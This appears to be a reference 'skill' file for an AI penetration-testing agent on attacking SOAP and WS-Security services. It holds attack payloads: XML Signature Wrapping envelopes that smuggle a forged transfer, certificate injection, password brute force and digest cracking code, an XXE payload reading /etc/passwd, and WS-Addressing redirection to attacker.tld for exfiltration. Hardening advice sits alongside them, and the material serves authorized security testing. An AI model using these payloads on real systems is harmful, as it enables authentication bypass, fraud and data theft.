---
name: SOAP WS-Security
description: Reference for SOAP / WS-Security testing covering WSDL discovery, XML Signature Wrapping (XSW), Binary Security Token (BST) injection, UsernameToken brute force, and SAML / WS-Federation handoffs.
---

# SOAP / WS-Security

Reference for testing legacy SOAP services and WS-Security envelopes. Pull this in when the target serves `application/soap+xml` (SOAP 1.2) or `text/xml` (SOAP 1.1), advertises a WSDL, or has `/services/`, `/ws/`, `/soap/`, `/axis/`, `/cgi-bin/ws/` under enterprise stacks (SAP, Oracle, IBM WebSphere, Microsoft BizTalk).

> Black-box scope: probes drive HTTP and observe SOAP-Fault / response-body diffs. Tool support uses Python `zeep` (now installed) and `execute_curl` for raw envelope crafting.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| WSDL discovery + parsing | `execute_curl` + `kali_shell` | `xmllint --xpath` over the WSDL XML. |
| Programmatic SOAP client | `execute_code` | `zeep.Client(wsdl_url)` exposes operations with type-checked args. |
| Raw envelope crafting | `execute_curl` | When `zeep` strict typing fights you (XSW, oversized fields). |
| WS-Trust / SAML binding | `execute_code` | `python3-saml` for SAML construction. |

### Captured-traffic workflow (proxy_brain tools)

When HTTP Traffic Capture is enabled, a captured valid `<wsse:Security>` envelope is the raw material for several probes. UsernameToken replay is redamon.replay of that captured transaction unchanged (the origin host-pinning matches the real service, so it is not a limitation here). XSW, BST injection, and SOAPAction confusion are body/header mutations delivered through redamon.replay (swap the body, add or override the SOAPAction header), and redamon.grep reads the response to tell a SOAP-Fault from an executed action. Where the proxy stops: WSDL discovery and parsing, and building valid typed calls, still run through zeep and execute_curl.

## SOAP primer

A SOAP message is an XML document with this shape:

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <!-- UsernameToken / BinarySecurityToken / SAML / Signature / Timestamp -->
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <ns:Operation xmlns:ns="http://target.tld/service">
      <arg1>value</arg1>
    </ns:Operation>
  </soap:Body>
</soap:Envelope>
```

WS-Security adds tokens, signatures, and encryption to the `<wsse:Security>` header. Operations live in `<soap:Body>`.

## Reconnaissance

### Discover SOAP endpoints

```
/services                /soap                /ws
/axis                    /axis2/services      /cgi-bin/ws
/?wsdl                   /Service.asmx        /Service.asmx?wsdl
/Service.svc             /Service.svc?wsdl    /Service.svc?singleWsdl
/Service.svc/mex          (WSDL via WS-MetadataExchange)
```

Probe:

```
execute_curl url: "https://target.tld/services?wsdl"
execute_curl url: "https://target.tld/Service.asmx?wsdl"
execute_curl url: "https://target.tld/api/v1?wsdl"
```

The WSDL describes:

- Service name + endpoints (`<wsdl:service>`, `<wsdl:port>`).
- Operations + arguments (`<wsdl:operation>`, `<wsdl:input>`, `<wsdl:output>`).
- Bindings (HTTP / SOAP / MIME).
- Types (XML Schema for arguments).

### Parse the WSDL

```
execute_code language: python
from zeep import Client
c = Client("https://target.tld/services?wsdl")
print(c)                                 # service / port summary
print(c.service.__dir__())               # list operations
# Build a real call:
print(c.service.GetUserDetails(userId=42))
```

zeep prints the operation list, parameter shapes, and types automatically.

### Fingerprint the stack

| Hint | Stack |
|---|---|
| `Server: Microsoft-IIS/...` + `.asmx` | ASP.NET ASMX (legacy) |
| `Server: Microsoft-IIS/...` + `.svc` | WCF |
| `X-Powered-By: ASP.NET` | .NET stack |
| Apache CXF banner in fault | Apache CXF (Java) |
| `Server: Apache/2 ... mod_axis2` | Apache Axis2 |
| Spring WS / spring-ws fault | Spring WS |
| BizTalk envelopes | Microsoft BizTalk |
| Oracle SOA Suite | Oracle Fusion |

Each ships its own quirks; CVE landscape varies (e.g. CVE-2017-5638 Apache Struts via Content-Type, but that is also reachable via SOAP-fronted endpoints).

## Attack matrix

### 1. UsernameToken brute force

```xml
<wsse:Security>
  <wsse:UsernameToken>
    <wsse:Username>admin</wsse:Username>
    <wsse:Password Type="...PasswordText">guess</wsse:Password>
  </wsse:UsernameToken>
</wsse:Security>
```

Two password types in WSS 1.x:

- `#PasswordText` -- cleartext (over TLS only, hopefully).
- `#PasswordDigest` -- `Base64(SHA-1(Nonce + Created + Password))`.

For digest, you can offline-crack captured `<wsse:Password>` values:

```
execute_code language: python
import base64, hashlib, datetime
def digest(password, nonce_b64, created):
    n = base64.b64decode(nonce_b64)
    h = hashlib.sha1(n + created.encode("utf-8") + password.encode("utf-8")).digest()
    return base64.b64encode(h).decode()
# Try a wordlist; compare to captured digest
```

### 2. XML Signature Wrapping (XSW)

The classic SOAP attack. Some signature verifiers locate the signed element by ID, then re-process the message; if the attacker injects a duplicate body with the same ID structure, the verifier validates the original but the consumer reads the malicious copy.

```xml
<soap:Envelope>
  <soap:Header>
    <wsse:Security>
      <ds:Signature>
        <ds:SignedInfo>
          <ds:Reference URI="#body-original"/>
        </ds:SignedInfo>
        <ds:SignatureValue>...</ds:SignatureValue>
      </ds:Signature>
      <!-- Attacker copies the original body here, signed correctly -->
      <Body wsu:Id="body-original">
        <GetBalance accountId="123"/>
      </Body>
    </wsse:Security>
  </soap:Header>
  <!-- Real consumer reads THIS body -->
  <soap:Body>
    <Transfer from="123" to="999" amount="1000000"/>
  </soap:Body>
</soap:Envelope>
```

Variants enumerated by Somorovsky et al., USENIX 2012 (canonical 8 XSW types; same family applies to SAML, see `/skill saml_attacks`):

| Variant | Description |
|---|---|
| 1. Wrapping in Header | Original signed body moved into Header, malicious in Body |
| 2. Sibling in Header | Signed element hidden as sibling of Header |
| 3. Sibling in Body | Two Body elements; signed one hidden by structure |
| 4. Signature in Header (referenced ID outside) | Verifier walks ID mismatch |
| 5-8. Combinations | Per parser quirk |

If the parser is XML-namespace-naive or ID-resolution-naive, multiple variants may succeed.

### 3. BinarySecurityToken (BST) injection

```xml
<wsse:BinarySecurityToken
  ValueType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3"
  EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">
  <attacker-x509-cert/>
</wsse:BinarySecurityToken>
```

Server uses the embedded cert to verify the signature. If the cert chain is not pinned to a trusted CA, the attacker provides their own cert and signs the envelope with the matching key.

### 4. UsernameToken without timestamp / nonce

Replay attack: capture a valid `<wsse:UsernameToken>` and replay it. Without `<wsu:Timestamp>` (`Created` + `Expires`) or a freshness check, replays succeed indefinitely.

### 5. WS-Addressing routing override

```xml
<wsa:To>http://attacker.tld/intercept</wsa:To>
<wsa:ReplyTo><wsa:Address>http://attacker.tld/reply</wsa:Address></wsa:ReplyTo>
<wsa:FaultTo><wsa:Address>http://attacker.tld/fault</wsa:Address></wsa:FaultTo>
```

If the service trusts client-supplied WS-Addressing for downstream routing, attacker controls reply / fault delivery -> SSRF / data exfil.

### 6. XXE in SOAP body

SOAP is XML; classic XXE applies:

```xml
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope ...>
  <soap:Body>
    <ns:GetUser><id>&xxe;</id></ns:GetUser>
  </soap:Body>
</soap:Envelope>
```

WS-Security does not fix XXE; the underlying parser must be hardened. Pivot to the existing `xxe` community skill / Strix XXE for the full payload set.

### 7. SOAPAction confusion

```
SOAPAction: "http://target.tld/service/Operation"
```

Some servers route by `SOAPAction` HTTP header, others by the body operation name. If they disagree, you can call operation A while the server thinks you called B.

```
execute_curl url: "https://target.tld/services" headers: "Content-Type: text/xml\nSOAPAction: \"OperationA\"" data: '<soap:Envelope>...<OperationB/>...</soap:Envelope>'
```

Some legacy stacks honor the body, some honor the header.

### 8. WS-Trust / WS-Federation handoffs

When the SOAP endpoint participates in WS-Federation (often paired with SAML for SSO):

- `RequestSecurityToken` (RST): client requests a token.
- `RequestSecurityTokenResponse` (RSTR): server issues.

Probes:

- Submit RST with `wst:KeyType` requesting bearer instead of holder-of-key.
- Replay an RSTR across audiences (analog of JWT `aud` confusion).
- Pivot to the SAML skill `/skill saml_attacks` for the SSO surface.

### 9. WSDL operation enumeration

Many services expose operations not advertised in the public WSDL. Probe:

```
SOAPAction: "Internal_DeleteUser"
SOAPAction: "Admin_GetAllSessions"
SOAPAction: "Debug_RunQuery"
```

against a known endpoint. Hidden operations sometimes return 200 with output rather than "operation not found".

## Probe templates

### zeep-driven baseline

```
execute_code language: python
from zeep import Client
from zeep.transports import Transport
import requests

session = requests.Session()
session.verify = True
t = Transport(session=session, timeout=10)

c = Client("https://target.tld/services?wsdl", transport=t)
print(c.wsdl.dump())                        # full operation map
result = c.service.GetUserDetails(userId=1)  # legitimate call
print(result)
```

### Raw envelope (XSW probe)

```
execute_code language: python
import requests
ENVELOPE = """<soap:Envelope xmlns:soap="...">
  <soap:Header>
    <!-- XSW variant 1 here -->
  </soap:Header>
  <soap:Body>
    <Transfer from="123" to="999" amount="999999"/>
  </soap:Body>
</soap:Envelope>"""
r = requests.post("https://target.tld/services",
                  headers={"Content-Type":"text/xml","SOAPAction":'""'},
                  data=ENVELOPE, timeout=10)
print(r.status_code, r.text[:2000])
```

### Tooling note

The brief flags `soapui` as missing. `zeep` plus `execute_curl` covers the full probe surface. For graphical exploration during operator-paired engagements, run `soapui` outside the agent if available; the agent's flow stays in `execute_code`.

## Validation shape

A clean SOAP / WS-Security finding includes:

1. The WSDL URL + relevant operation name.
2. The legitimate request that succeeds (baseline).
3. The crafted envelope demonstrating the bypass (XSW variant, BST injection, replay, etc.).
4. The server response (200 + executed action vs faulted).
5. For XSW: a screen capture or transaction-log entry confirming the malicious body was processed.
6. For BST injection: the attacker cert / key used.

## False positives

- WSDL exposed but every operation requires WS-Security with strict signature validation, and the validator does namespace-aware ID resolution (XSW immune).
- BST referenced but the cert chain is pinned to a corporate CA the attacker cannot forge.
- UsernameToken with PasswordDigest + nonce + timestamp, freshness window enforced.
- Server returns SOAP-Fault for every malformed payload regardless of variant.
- WS-Addressing fields ignored by the server (routing happens at the gateway, not in the body).

## Hardening summary

- Pin signature verification to the X.509 chain expected for the issuer; reject inline BST not in the trust store.
- Validate signature scope to specific elements with namespace-aware ID resolution; reject duplicate IDs.
- Enforce `<wsu:Timestamp>` `Created` + `Expires` with a tight (5 minute) skew window.
- Require nonce + per-message uniqueness for UsernameToken.
- Disable inline DOCTYPE and external entity resolution on the XML parser.
- Bind WS-Addressing fields to a server-side allowlist; do not trust client `wsa:To`/`ReplyTo` for routing.
- Strip the WSDL from production unless it is genuinely required for partners; serve it from an authenticated channel when needed.

## Hand-off

```
WS-Security XSW                       -> escalate; auth bypass / privileged op execution
BST chain trust missing                -> file as Authentication Bypass + WS-Security
XXE in SOAP body                       -> /skill xxe (community skill)
SOAPAction confusion                   -> escalate; logical bypass
WS-Trust / WS-Federation chain         -> /skill saml_attacks
SOAP -> SQLi via parameter             -> built-in sql_injection skill
SOAP -> SSRF via WS-Addressing          -> built-in ssrf_exploitation skill
```

## Pro tips

- The WSDL is gold: every operation, every parameter, every namespace. Fetch and parse it before crafting envelopes.
- `zeep` is generally more reliable than hand-built envelopes when you're enumerating; switch to raw envelopes only for XSW / BST / oversized-field probes.
- ASMX (.NET 2.0) and Axis (Apache) services from 2005-2012 era are the richest hunting grounds. Many are still in production and rarely audited.
- WS-Security is one of the most under-tested attack surfaces in modern bug bounties because most testers skip XML-heavy stacks.
- Always test BOTH signed and unsigned operations; some endpoints only require WS-Security on a subset of operations.
- SOAP 1.1 vs 1.2 differ in `Content-Type` (`text/xml` vs `application/soap+xml`) and `SOAPAction` semantics; some servers honor only one. Test both.
